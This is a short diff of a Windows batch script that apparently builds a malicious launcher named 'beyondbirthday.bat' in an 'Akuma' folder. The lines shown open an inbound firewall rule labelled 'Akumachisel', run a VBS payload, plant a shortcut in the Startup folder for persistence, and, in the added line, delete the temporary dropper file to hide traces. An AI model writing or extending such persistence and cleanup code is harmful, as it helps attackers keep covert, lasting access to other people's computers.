@@ -13,6 +13,7 @@ echo powershell New-NetFirewallRule -DisplayName "Akumachisel" -Direction Inboun
 echo start %homedrive%\Akuma\誕生日.vbs >> %homedrive%\Akuma\beyondbirthday.bat
 echo cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" >> %homedrive%\Akuma\beyondbirthday.bat
 echo del "beyondbirthday.lnk" >> %homedrive%\Akuma\beyondbirthday.bat
+echo del %temp%\Akuma.bat >> %homedrive%\Akuma\beyondbirthday.bat
 powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\beyondbirthday.lnk');$s.TargetPath='%homedrive%\Akuma\beyondbirthday.vbs';$s.Save()"
 set "vbsFilePath=%homedrive%\Akuma\beyondbirthday.vbs"
 IF EXIST "%vbsFilePath%" (
